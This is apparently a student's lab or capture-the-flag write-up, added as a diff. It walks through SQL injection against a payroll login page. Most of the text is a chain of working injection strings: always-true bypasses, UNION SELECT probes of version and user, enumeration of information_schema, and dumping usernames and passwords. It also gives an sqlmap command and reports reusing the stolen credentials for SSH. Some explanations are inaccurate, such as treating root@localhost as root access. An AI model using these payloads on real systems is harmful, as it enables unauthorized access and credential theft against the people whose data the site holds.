@@ -1,0 +1,33 @@
+sql is a database which it has tables and informations in these tables and 
+it also has it's own unique programing language , we use this programing 
+language to gain informations that no one was supposed to see expect 
+users and admins
+we only have to enter the codes in login page
+the first is to use ' or 1=1;-- this means (') or (1=1) which 1 is always equals to 1
+so bec of that it means its true and the data base will return informations of
+people and their names salaries and etc, however we are not done yet and we 
+stil have more codes to enter, another one is :
+' or 1=1 union select 1,2,3,4 
+this will show the 4 resualts of collumns in table
+the next code is : ' or 1=1 union select 1,2,3,version();-- this will show 
+the version of the servers' pc if we change the 3 in the last code to 
+user() we will also see the user who owns this web server and the result is
+root@localhost which its a good news and this is root access
+
+
+Its time for us to see all tables so we use ' or 1=1 union select 1,2,3,table_name from information_schema.tables;--
+with this we can see the tables , now that we have the tables its time to see 
+what's inside the users , So we use :
+' or 1=1 union select 1,2,3,column_name from information_schema.columns where table_name = 'users';-- , I will put a picture of this result as well
+
+so according to the picture and what we have earned now we see that users also has passwords in it now for seeing passwords as well as users
+next to them we use code :
+' or 1=1 union select 1,2,usernames,password from users;-- 
+and now we have all the usernames and passwords , we even can try to do a ssh to this pc with this username and password which 
+it did work 
+
+
+By the way we can also use sqlmap which its a very usefull tool and it will try to know about the data base and it's simple to use,only enter:
+sqlmap -u http://10.10.10.server/payroll_app.php --forms --tables ,-u is for the address of the site 
+
+If we also can have access to the php file of this website we can inject our code such as ' or 1=1;-- in it and it will show the same results
